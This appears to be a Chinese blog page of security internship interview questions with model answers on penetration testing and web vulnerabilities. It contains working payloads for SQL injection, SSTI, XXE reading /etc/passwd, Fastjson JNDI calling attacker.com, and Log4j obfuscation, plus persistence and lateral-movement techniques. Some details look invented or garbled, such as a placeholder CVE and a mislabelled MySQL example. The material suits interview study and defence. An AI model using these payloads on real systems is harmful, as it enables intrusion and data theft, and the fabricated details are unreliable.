---
title: 厂商面试内容
date: 2026-01-02
updated: 2026-01-02
tags:
  - 面试求职
categories:
  - 面试求职
description: None
---
> https://blog.csdn.net/m0_62828084
> https://blog.csdn.net/m0_62828084?type=blog&year=2025&month=03

# 字节

## [250304 渗透测试实习](https://blog.csdn.net/m0_62828084/article/details/146008135)

```txt
1. 渗透流程
2. 信息收集如何处理子域名爆破中的泛解析问题
3. 绕过CDN寻找真实IP
4. PHPINFO页面关注信息
5. 有没有了解权限维持
6. 举例一个漏洞详细描述
7. 输出到href的xss如何防御
8. samesite防御CSRF的原理
9. CSRF的防御
10. json格式的CSRF如何防御
11. 浏览器解析顺序和解码顺序
12. 过滤逗号的sql注入如何绕过
13. 过滤limit后的逗号如何绕过
14. fastjson相关漏洞
15. Python相关的漏洞回答（flask、SSTI原理）
```

### 1. 渗透流程

- 情报收集：
	- 被动收集：Whois 查询、证书透明度日志（CT Logs）、GitHub 代码泄露。
	- 主动探测：子域名爆破（使用 Amass/Sublist3r）、端口扫描（Masscan/Nmap）。
- 漏洞分析：
	- 自动化扫描：AWVS/Nessus 检测常见漏洞（SQLi/XSS）。
	- 手动验证：验证误报漏洞，如逻辑漏洞（越权/支付绕过）。
- 攻击利用：
	- 漏洞利用：通过 Metasploit 或定制化 EXP 攻击目标（如 ThinkPHP RCE）。
	- 权限提升：利用内核漏洞（DirtyCow）或 SUID 提权（`find / -perm -4000`）。
- 权限维持：
	- 植入 WebShell：加密后门（如蚁剑 AES 加密 Shell）。
	- 系统后门：Windows 注册表后门、Linux cronjob 定时任务。
- 横向移动：
	- 内网渗透：利用 Responder 抓取 Net-NTLM 哈希、Pass-The-Hash 攻击。
	- 数据窃取：通过 DNS 隧道或 HTTP 隐蔽信道外传数据。

### 2. 子域名爆破中的泛解析问题处理

泛解析问题：所有未注册子域名解析到同一 IP（如 `*.example.com → 1.1.1.1`）。

解决方案：

- 响应指纹去重：
	- 对比 HTTP 响应头（Server/Cookie）和页面哈希（如 SimHash）。
	- 使用工具（FFUF/GoBuster）的 `-mc` 参数过滤重复状态码。
- 证书透明度日志：
	- 通过 `crt.sh` 查询合法子域名证书记录。
- 历史 DNS 记录：
	- 使用 SecurityTrails/ViewDNS 查询历史 A 记录。
- 字典智能生成：
	- 基于目标业务关键词生成子域（如 `dev/api/test`）。

### 3. 绕过 CDN 寻找真实 IP 的六种方法

- DNS 历史记录：通过 DNSDB 查询目标域名历史解析 IP。
- 全球 Ping 测试：多地服务器（AWS EC2/DigitalOcean）执行 ping 或 curl。
- SSL 证书关联：Censys 搜索相同证书的 IP（`parsed.names:example.com` ）。
- 敏感子域名：访问 `mail.example.com` 或 `internal.example.com` 可能直连真实 IP。
- 邮件服务器追踪：注册目标服务触发邮件，解析邮件头 Received 字段。
- SSRF 漏洞利用：通过目标服务器的 SSRF 漏洞获取内网 IP。

### 4. PHPINFO 页面关键信息审计

- 敏感配置项：
	-  `allow_url_fopen=On`：允许远程文件包含（RFI）。
	-  `disable_functions`：未禁用 `system/shell_exec` 等危险函数。
- 环境变量泄露：
	-  `$_SERVER['DB_HOST']`、`$_ENV['API_KEY']`。
- 临时文件路径：
	-  `upload_tmp_dir` 可能暴露可写目录路径。
- 扩展模块风险：
	- 启用 `imap` 扩展可能导致 CVE-2018-19518 漏洞。

### 5. 权限维持技术详解

- WebShell 持久化：
	- 隐藏文件名：`.config.php` + 修改文件时间戳（`touch -t`）。
- 系统级后门：
	- Windows：注册表键 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` 添加启动脚本。
	- Linux：`/etc/rc.local` 添加反向 Shell 命令。
- 内存驻留马：
	- Java 内存马：通过 JSP 注入 Filter 型内存 Shell。
	- PHP 内存马：利用 `php-fpm` 未授权访问注入。

### 6. 漏洞示例：SQL 注入（以 MySQL 为例）

漏洞原理：未过滤用户输入的 id 参数直接拼接 SQL 语句。

利用 Payload：

```url
/product?id=1' UNION SELECT 1,@@version,3-- -
```


攻击效果：泄露数据库版本、用户权限等敏感信息。

修复方案：

- 使用预编译语句（PDO/MyBatis）。
- 输入过滤：正则匹配 `/[^0-9]/` 限制为数字。

### 7. 输出到 href 的 XSS 防御

漏洞示例：

```html
<a href=" {{ user_input }} ">Link</a> 
<!-- 用户输入为javascript:alert(1) -->
```

防御措施：

- 协议白名单：仅允许 `http://`、`https://`。
- URL 编码：对 href 值进行 HTML 实体编码（如 `&→&amp;`）。
- CSP 策略：设置 `Content-Security-Policy: default-src 'self'`。
- 框架安全：Vue/React 自动转义 href 中的动态内容。

### 8. SameSite 防御 CSRF 原理

- SameSite=Strict：完全禁止跨站请求携带 Cookie（如银行转账）。
- SameSite=Lax：允许 GET 请求携带 Cookie（适用于普通站点）。
- SameSite=None：必须与 Secure 属性共用（仅限 HTTPS）。

### 9. CSRF 防御方案

- Token 验证：表单中嵌入随机 Token（如 Django 的  `{% csrf_token %}`）。
- 双重 Cookie：请求头中携带 Cookie 哈希值（如如 `X-CSRF-Token: hash(cookie)`）。
- Referer 检查：验证请求来源域名是否在白名单内。

### 10. JSON 格式 CSRF 防御

- Content-Type 校验：拒绝非 `application/json` 请求。
- Token 嵌入 JSON：
```json
{"data": "test", "csrf_token": "random_value"}
```
- 禁用 CORS：设置 `Access-Control-Allow-Origin` 为特定域名。

### 11. 浏览器解析与解码顺序

- HTML 解析优先：
	- 解析标签和实体（如 `&lt;` → `<`）。
- JavaScript 执行：
	- 处理 Unicode 转义（如 `\u003c` → `<`）。
- URL 解码：
- 转换 `%20` 为空格。

示例：

```html
<a href="javascript:alert(1%26%23x29;)"></a> 
```

解码顺序：`%26` → `&` → `&#x29;` → `)` → 最终执行 `alert(1)`。

### 12. 过滤逗号的 SQL 注入绕过

场景：`SELECT 1,2,3` 被拦截。

绕过方法：

- JOIN 语法：

```sql
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
```

- LIMIT OFFSET：

```sql
UNION SELECT 1 FROM users LIMIT 1 OFFSET 1 
```

### 13. 过滤 LIMIT 逗号的绕过

场景：`LIMIT 0,1` 被拦截。

绕过方法：

- SQL Server 语法：

```sql
SELECT TOP 1 * FROM users 
```

- 变量赋值（MySQL）：

```sql
SELECT * FROM users LIMIT 1 OFFSET 0 
```

### 14. Fastjson 漏洞解析

漏洞根源：反序列化时自动调用 `getter/setter` 方法（如 CVE-2022-25845）。

利用条件：目标开启 autoType 功能。

Payload 示例：

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://attacker.com/exp"} 
```

修复方案：升级到 Fastjson 1.2.83+，关闭 autoType。

### 15. Python 漏洞：Flask SSTI

漏洞原理：未过滤用户输入直接渲染模板。

示例代码：

```python
@app.route('/hello/<name>') 
def hello(name): 
	return render_template_string(f'Hello {name}!') 
```

攻击 Payload：

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

防御措施：

- 使用安全模板引擎（Jinja2 自动转义）。
- 输入过滤：禁止用户输入 {{}} 等特殊字符。

## [250306 安全研究实习生 一面](https://blog.csdn.net/m0_62828084/article/details/146027387)

```txt
1. 你投的岗位是安全研究生，你了解我们这边主要是做什么的吗
2. 现在有比较想做的方向吗，比如你写的代码审计、攻防演练、你在学校的研究方向（密码学）其实是三个大方向，现在有什么比较想做的吗 ，说代码审计、安全研究 
3. 有没有审计过开源框架、cms、中间件之类的 
4. 我看你简历上有几段实习经历和项目经历，先聊下实习经历吧，在A主要做什么的 
5. 详细聊聊入侵检测主要在做什么，遇到的问题 
6. 关于入侵检测产生大量误报的原因，有没有分析过，有没有比较好的解决方法 
7. 和A比起来，B的就应该比较偏攻击方对吧，有代码审计，聊一下在B主要做了什么 
8. 审表达式引擎的步骤和思路 
9. 刚刚你说的审计听起来好像和普通开发的审计差不多，都是通过程序流、文档去做，有没有从安全方面审计一些项目 
10. XXE是怎么造成的，从代码层面来看 
11. 我看你简历与很多次攻防演练经历对吧，这几段攻防经历有没有哪一次印象比较深刻，挑一个聊一聊 
12. 你这次攻击好像更多的利用弱口令，有没有一些更有技巧的方法 
13. 这个头像上传webshell是怎么上传的
```

### 1. 岗位认知与方向选择

1. 对公司业务的理解

贵司的安全研究方向聚焦于三大核心领域：

- 代码审计：深入分析开源组件、企业级框架的漏洞（如供应链攻击面、逻辑缺陷），结合自动化工具（如 CodeQL）和人工审计，构建软件全生命周期安全防护。
- 攻防演练：覆盖红蓝对抗、APT 模拟攻击、漏洞武器化利用，重点突破云原生和混合架构下的防御盲区。
- 安全研究：前沿领域如后量子密码迁移风险、AI 模型对抗攻击、硬件安全（如 CPU 侧信道漏洞挖掘）。

2. 个人研究方向选择

优先选择代码审计与安全研究的交叉领域，原因如下：

- 行业痛点：根据 Synopsys 2024 报告，70%的企业软件包含高危开源漏洞，而传统 SAST 工具误报率达 35%以上，需结合深度代码分析和攻击链建模提升精度。
- 技术优势：在密码学研究中积累的形式化验证方法（如 Z3 约束求解器）可迁移至智能合约审计，例如通过符号执行检测重入漏洞。

### 2. 代码审计实战经验

1. 开源框架审计案例

项目名称：Apache DolphinScheduler 3.1.3 权限绕过漏洞（CVE-2024-XXXX）

- 漏洞原理：接口鉴权逻辑未校验用户租户上下文，攻击者可越权访问其他租户任务日志。

```java
// 错误代码：仅校验用户存在性，未绑定租户 ID 
public void getTaskLog(User user, String taskId) {
	if (user != null) {
		// 直接查询 taskId 日志（未关联租户） 
		logService.queryLog(taskId); 
	} 
}
```

- 修复方案：在查询条件中强制绑定租户 ID（`WHERE tenant_id = #{user.tenantId}` ）。

2. 安全审计方法论

区别于普通开发审计的三重增强策略：

- 攻击面建模：基于数据流绘制“敏感操作链”，识别未净化的输入源（如 HTTP 头、反序列化入口）。
- 上下文感知规则：结合框架特性定制检测规则，例如 Spring Security 中@PreAuthorize 注解的缺失扫描。
- 沙盒动态验证：对高危函数（如 `Runtime.exec()` ）植入 Hook，触发时自动生成 PoC 测试流量。

### 3. 入侵检测系统（IDS）优化实践

1. 工作内容与挑战

在 A 公司主导云原生 IDS 引擎研发，核心任务包括：

- 协议解析：对 Kubernetes API Server 审计日志进行行为建模，识别异常 Pod 创建（如特权容器）。
	- 误报治理：某金融客户误报率高达 65%，溯源发现主要原因为：
	- 规则冲突：多部门自定义规则库未归一化，导致重复告警。
	- 环境噪声：CI/CD 流水线的自动化部署被误判为横向渗透。

2. 动态缓解方案

实施分层过滤机制：

- 预处理层：通过白名单过滤已知合法流量（如 K8s 滚动更新事件）。
- 关联分析层：基于 Sigma 规则构建攻击场景图谱，例如「SSH 爆破成功 + 敏感文件访问」组合触发告警。
- 反馈学习层：将误报案例输入图神经网络（GNN），生成自适应阈值规则。

成果：误报率降至 12%，检出率提升至 89%。

### 4. 攻防演练深度案例分析

1. 某能源企业红队实战

攻击路径：

- 初始突破：通过暴露的 Jenkins 未授权接口下载构建日志，提取硬编码的 GitLab 凭据。
- 横向移动：利用 Ansible 配置漏洞在 K8s 节点部署恶意 DaemonSet，劫持容器流量。
- 权限维持：在 Prometheus 告警规则中植入反向 Shell 指令，利用其高频率查询特性实现持久化。

2. 高级攻击技巧补充

- 弱口令绕过：并非直接爆破，而是结合密码策略规律生成字典（如「公司名+年份+特殊字符」模式）。
- 协议隐匿：将 C2 通信伪装为 gRPC 健康检查流量，利用 TLS 客户端证书双向认证绕过网络审计。

### 5. 安全代码审计专项

1. 表达式引擎审计案例

目标系统：企业自研规则引擎（类似 Spring EL）

审计步骤：

- 词法分析：检查表达式解析器是否允许反射调用（如 `T(java.lang.Runtime).exec()` ）。
- 上下文隔离：验证沙盒实现是否限制类加载器（如禁用 `ClassLoader.defineClass()` ）。
- 沙盒逃逸测试：构造嵌套表达式绕过黑名单（`''.getClass().forName('java.lang.Runtime')` ）。

2. 安全审计 VS 开发审计

安全增强点：

- 输入验证：禁止非受信数据流入表达式解析器（如用户输入的规则条件）。
- 上下文裁剪：运行时移除危险函数（如通过 Java Security Manager 禁用 `System.exit()` ）。

### 6. 漏洞原理与技术验证

1. XXE 漏洞代码层分析

漏洞代码：

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); 
DocumentBuilder builder = factory.newDocumentBuilder(); // 未禁用外部实体 
Document doc = builder.parse(input);
``` 

攻击载荷：

```xml
<!DOCTYPE test [
	<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; 
]>
```

修复方案：

```java
// 手动关闭了解析器的敏感功能
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);	// 解析器将不再处理 XML 正文中的外部实体引用
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);	// 解析器将不再处理 DTD 内部定义的参数实体（即你例子中 %xxe; 这种形式）
```


2. 头像上传 Webshell 实战

绕过技巧：

- 文件类型混淆：修改文件魔数（Magic Bytes）为 GIF 头 `47 49 46 38`，同时保留 `.php` 扩展名。
- 路径穿越：构造文件名 `avatar.png/../shell.php` ，利用 Nginx 路径规范化漏洞写入 Web 目录。
- 解析漏洞：上传 `.php.xxx` 文件，触发服务器解析歧义（如 Apache 的 `mod_negotiation` 模块）。

### 7. 防御体系建议与趋势洞察

1. 主动防御建议

- 代码审计自动化：将 Semgrep 规则库与 GitHub Actions 集成，实现 Commit 级漏洞拦截。
- 攻击面收敛：对互联网暴露的 API 接口实施动态鉴权，基于 JWT 声明实时校验访问上下文。

2. 技术趋势

- AI 安全：研究 LLM 生成的代码是否存在隐藏后门（如通过特定触发词激活恶意逻辑）。
- 硬件赋能：利用 Intel CET（控制流强制技术）防御 ROP 攻击，降低内存漏洞利用成功率。


# 阿里云

## [250304 阿里云安全实习](https://blog.csdn.net/m0_62828084/article/details/146008537)

```txt
1. 看你简历上说擅长java、php代码审计，也没有类似的经历能够分享一下，比如说独自审的一套代码或者开源项目，从中发现的一些比较高危的问题。
2. 在审计项目的时候，比如一个web网站，简单说说思路。
3. 简单描述一下什么是水平越权，什么是垂直越权，我要发现这俩类漏洞，那我代码审计要注意什么地方。
4. 解释一下SSRF
5. 如何防御SSRF，场景：http://ip/?url=image.jpg
6. 场景的内网网段有哪些，他们的掩码是什么
7. 教育系统攻防演练，分享一个渗透的例子。
8. 除了学校，有没有渗透过别的系统
9. 这样的场景（给内网靶标），渗透内网系统的思路。
10. 反问环节，岗位做的是阿里云云平台安全，内部安全保障，保障阿里云自身的安全不出问题。整个系统的上线中前后过程，每个方向都有人。
```

### 1. 代码审计经验与思路

- 实战案例分享
	- Java 反序列化漏洞：审计某开源 CMS 时发现 `ObjectInputStream` 未做白名单过滤，攻击者可构造恶意序列化数据实现 RCE（如利用 Apache Commons Collections 链）。
	- PHP 文件上传绕过：在电商系统中发现未校验文件 MIME 类型及后缀黑名单不完整（如 `.phtml` 未过滤），导致 webshell 上传。
	- 水平越权漏洞：用户查询订单接口未校验 userId 与 Session 绑定，通过修改 URL 参数可遍历他人数据。
- Web 代码审计通用思路
	- 入口点分析：优先检查用户输入层（HTTP 参数、Headers、Cookie）和敏感功能模块（登录、支付、文件上传）。
- 数据流追踪：从 `$_GET/$_POST` 到 SQL 查询/文件操作，验证过滤逻辑（如 `htmlspecialchars` 防 XSS、PDO 预处理防注入）。
- 框架安全配置：检查 Struts2/Spring Security 等组件版本是否存在已知漏洞（如 CVE-2017-5638）。
- 权限控制盲区：全局搜索 `isAdmin()`、`checkPermission()` 等函数调用是否缺失或逻辑错误。
- 日志与异常处理：观察错误信息泄露（如堆栈跟踪暴露路径）或日志未脱敏（记录明文密码）。

### 2. 越权漏洞原理与审计要点

| 类型       | 定义                          | 代码审计已关注点                                            |
| -------- | --------------------------- | --------------------------------------------------- |
| **水平越权** | 同角色用户间越权访问数据（如 A 查看 B 的订单）  | 检查数据查询是否绑定用户唯一标识（如 `WHERE user_id=$current_user`）   |
| **垂直越权** | 低权限用户访问高权限功能（如普通用户调用管理员 API） | 验证接口是否强制校验角色（如 `@PreAuthorize("hasRole('ADMIN')")`） |

### 3. SSRF 漏洞解析与防御

- **SSRF 原理**  
    - 攻击者通过服务端发起伪造请求，绕过网络边界访问内网资源（如 `file:///etc/passwd` 或 `http://169.254.169.254` 获取云元数据）。
- **防御方案（以 `http://ip/?url=image.jpg` 为例）**
    - **输入过滤**：使用正则表达式限制 `url` 参数为域名白名单（如 `^https?://(example\.com|cdn\.safe\.net)/`）。
    - **协议限制**：禁用 `file://`、`gopher://` 等高危协议。
    - **网络隔离**：配置防火墙禁止应用服务器访问内网网段（如 `10.0.0.0/8`）。
    - **DNS 重绑定防护**：解析 URL 域名后二次验证 IP 是否在允许范围内。
- **典型内网网段及掩码**
    - `10.0.0.0/8`（掩码 255.0.0.0）
    - `172.16.0.0/12`（掩码 255.240.0.0）
    - `192.168.0.0/16`（掩码 255.255.0.0）
    - `169.254.0.0/16`（链路本地地址，常用于云元数据服务）

### 4. 教育系统攻防演练案例

**场景**：某高校 OA 系统渗透

1. **入口突破**：通过弱口令 `admin/admin123` 登录后台，发现 SQL 注入漏洞（`id=1' AND 1=1--`）。
2. **权限提升**：利用注入点导出数据库，获取管理员哈希值并破解（MD5 加盐不充分）。
3. **横向移动**：通过管理员权限下载学生信息表，发现内网 Gitlab 地址（`10.10.1.20`），利用未授权访问漏洞获取源代码。
4. **持久化**：在服务器写入计划任务反弹 Shell，最终控制教务系统核心数据库。

### 5. 内网渗透通用思路

- **信息收集**
    - ARP 扫描（`nmap -sn 10.0.0.0/24`）定位存活主机。
    - 端口服务识别（如 445 端口可能存在永恒之蓝漏洞）。
- **漏洞利用**
    - 针对老旧系统（如 Windows Server 2008）尝试 MS17-010。
    - 利用 Redis 未授权访问写入 SSH 公钥。
- **横向移动**
    - 抓取内存密码（Mimikatz）或 Pass-The-Hash 攻击。
    - 通过 SMB 共享文件植入后门。
- **权限维持**
    - 创建隐藏账户或注册表注入。
    - 部署 Cobalt Strike Beacon 实现 C2 通信。
- **跨网段攻击**
    - 通过已控主机作为跳板，渗透核心业务区（如数据库 VLAN）。

### 6. 岗位适配性说明（阿里云云平台安全）

- **系统上线全周期防护经验**
    - **开发阶段**：参与过 SDL 流程，推动 API 接口鉴权方案（如 OAuth2.0）和代码安全扫描（SonarQube）。
    - **测试阶段**：设计灰盒测试用例，覆盖配置错误（如 OSS Bucket 权限泄露）和逻辑漏洞（如订阅服务并发扣费缺陷）。
    - **运维阶段**：搭建 WAF 规则防御 CC 攻击，通过 HIDS 监控异常进程行为（如挖矿木马）。
- **内部安全保障能力**
    - 曾主导 RBAC 权限矩阵梳理，实现最小化授权（如 RAM 策略限制 `Action: ecs:Delete*`）。
    - 设计过 KMS 密钥轮转方案，满足等保 2.0 三级要求。

### 7. 反问环节建议

- **团队协作**：询问安全左移的具体实践（如 CI/CD 流水线中 SAST/DAST 工具集成）。
- **技术栈**：了解内部自研防御系统（如针对 DDoS 的流量清洗算法）。
- **合规性**：探讨云平台如何满足 GDPR 或国内《数据安全法》要求。

# 深信服

## [250305 漏洞研究员实习](https://blog.csdn.net/m0_62828084/article/details/146027369)

```
1. 在XX实习时做了什么
2. 渗透测试的思路简单描述
3. 护网中承担什么角色
4. 红队一些攻击思路
5. 拿下系统如何横向
6. 前段时间的那个log4j有研究吗，可以简单说一下吗
7. （接上）有哪些混淆绕过的方法
8. 内存码有没有了解
9. 冰蝎、哥斯拉这些工具有没有了解过
10. 做攻击队的时候有没有研究过什么攻击，比如研究一些工具还是魔改什么的
11. 那么多漏洞和攻击，比较擅长哪一个
12. 说下shiro反序列化的形成原因、利用链
13. 对一些bypass的方法有没有了解过，什么姿势可以简单介绍一下。
```

### 1. 在 XX 实习时做了什么

在实习期间，主要围绕渗透测试、漏洞挖掘和攻防实战展开：

- 渗透测试项目：参与内/外部资产的安全评估，包括 Web 应用、API 接口和内部系统的漏洞扫描（如 SQL 注入、XSS、逻辑漏洞等）。
- 漏洞挖掘与利用：针对 Java 框架（Shiro、Fastjson）、中间件（WebLogic、Tomcat）进行代码审计，复现历史漏洞并尝试发现新攻击面。
- 红蓝对抗支持：协助防守方分析攻击流量，溯源攻击链；同时模拟攻击队编写 PoC 工具，绕过 WAF 规则。
- 报告输出：整理漏洞复现步骤、风险等级和修复方案，推动开发团队修复高危漏洞。

### 2. 渗透测试的思路简单描述

渗透测试核心流程分五阶段：

- 信息收集：
	- 子域名枚举（如 subfinder）、端口扫描（nmap）、指纹识别（Wappalyzer）。
	- 敏感信息泄露（GitHub 源码、备份文件、配置文件）。
- 漏洞扫描与验证：
	- 工具自动化扫描（AWVS、Nessus），结合手动验证误报（如逻辑漏洞、未授权访问）。
- 权限提升：
	- 通过弱口令、反序列化、文件上传等漏洞获取初始立足点。
- 横向移动：
	- 利用内网协议（SMB、WinRM）、凭证窃取（Mimikatz）扩大控制范围。
- 报告输出：
	- 输出漏洞详情、攻击路径图及修复建议。

### 3. 护网中承担什么角色

- 攻击队角色：
	- 突破入口：针对暴露面（Web 应用、VPN、邮件系统）进行漏洞利用（如 Log4j、OA 系统 RCE）。
	- 横向渗透：通过内网代理（如 reGeorg）和口令爆破（Hydra）拿下域控或核心数据库。
- 防守经验：
	- 分析攻击流量特征（如冰蝎流量加密），优化 WAF 规则；
	- 协助处置应急事件（如 Webshell 查杀、日志溯源）。

### 4. 红队一些攻击思路
初始入侵阶段：

- 鱼叉攻击：钓鱼邮件投递恶意文档（CVE-2021-40444）或伪装升级包（供应链污染）。
- 0day/Nday 利用：针对未修复的高危漏洞快速突破（如 Confluence RCE）。

横向扩展阶段：

- 凭证窃取：通过 Mimikatz 提取内存密码、Kerberoasting 攻击获取服务账户哈希。
- 权限维持：部署隐蔽后门（如计划任务、WMI 事件订阅）、黄金票据伪造域管权限。

### 5. 拿下系统如何横向

横向移动关键步骤：

- 信息收集：
	- 内网资产扫描（Netsparker、Fscan），定位高价值目标（数据库、域控）。
- 凭证利用：
	- Pass-the-Hash（NTLM 哈希传递）、Pass-the-Ticket（Kerberos 票据转发）。
- 协议漏洞：
	- 利用 SMBGhost（CVE-2020-0796）、Zerologon（CVE-2020-1472）直接提权。
- 隐蔽通道：
	- 通过 DNS 隧道（dnscat2）、HTTP 代理（Chisel）绕过网络隔离。

### 6. Log4j 漏洞（CVE-2021-44228）研究

原理：Log4j 2.x 版本解析日志时，未对 `${jndi:ldap://xxx}` 等表达式过滤，导致 JNDI 注入，远程加载恶意类触发 RCE。

混淆绕过方法：

- 环境变量注入：`${${env:XXX:-j}ndi:ldap://xxx}`（利用默认值覆盖）。
- Lower/Upper 关键字：`${jNdi:ldap://xxx}`（大小写绕过）。
- 嵌套表达式：`${${::-j}ndi:ldap://xxx}`（特殊符号替换）。
- 绕过高版本限制：利用上下文变量（如 `${ctx:xxx}`）拼接攻击载荷。

### 7. 内存码（Shellcode Loader）了解

- 原理：将恶意代码（如 Cobalt Strike 的 Beacon）直接加载到内存中执行，避免文件落地。
- 常见技术：
	- 反射型 DLL 注入：通过 VirtualAlloc 分配内存并执行。
	- 进程镂空（Process Hollowing）：替换合法进程内存内容（如 svchost.exe ）。
- 对抗检测：通过加密壳（如 AES）、API 调用混淆（如 Syscall 直接调用）绕过 EDR。

### 8. 冰蝎、哥斯拉工具分析

- 冰蝎（Behinder）：
	- 特点：动态密钥加密流量（AES+随机 Key），支持 HTTP/HTTPS 隧道。
	- 检测难点：特征为固定 UA 头和 Content-Type: application/octet-stream。
- 哥斯拉（Godzilla）：
	- 优势：支持更多加密算法（如 RSA）、模块化功能（内网穿透、端口扫描）。
	- 绕过技巧：修改默认密钥、自定义 HTTP 头字段混淆流量。

### 9. 攻击队研究重点

- 工具武器化：
	- 魔改 C2 框架（如 Cobalt Strike Aggressor 脚本），适配目标环境。
	- 开发轻量级漏洞利用工具（如 Fastjson 一键利用）。
- 流量混淆：
	- 对 Webshell 流量进行分段编码（如 Base64+Hex 混合）、添加垃圾数据。
- 供应链攻击：
	- 研究第三方组件漏洞（如 npm 包、Docker 镜像投毒）。

### 10. 擅长漏洞/攻击方向

反序列化漏洞：

- 擅长点：Java 反序列化链构造（如 CommonsBeanutils、CC 链）、内存马注入。
- 实战案例：通过 Shiro RememberMe 字段反序列化打入内网，结合 JNDI 注入加载内存马。

### 11. Shiro 反序列化漏洞解析

形成原因：

- Shiro 使用硬编码 AES 密钥加密 RememberMe 字段，攻击者通过伪造 Cookie 触发反序列化。
- 反序列化入口点：`AbstractRememberMeManager #decrypt ` 方法。

利用链（以 CommonsBeanutils 为例）：

- 触发点：恶意 Cookie → AES 解密 → 反序列化 → 调用 `BeanComparator.compare()` 。
- 利用链：通过 `PropertyUtils.getProperty()` 触发任意 Getter 方法，最终执行 TemplatesImpl 加载字节码。

### 12. Bypass 方法示例

常见绕过姿势：

- 编码混淆：URL 编码、Unicode 转义（如 `<img src=x onerror=alert(1)>` → `\u003cimg\u0020src=x...`）。
- 关键字分割：利用注释符或拼接（如 `<svg/onload=alert ``(1)>`）。
- 协议特性：
	- HTTP 参数污染（HPP）：param=1&param=payload 触发解析差异。
	- 特殊符号：`${1+1}` 在 Thymeleaf 等模板引擎中执行表达式。

# 腾讯

## [250307 技术安全实习](https://blog.csdn.net/m0_62828084/article/details/146027391?spm=1001.2014.3001.5502)

```txt

```




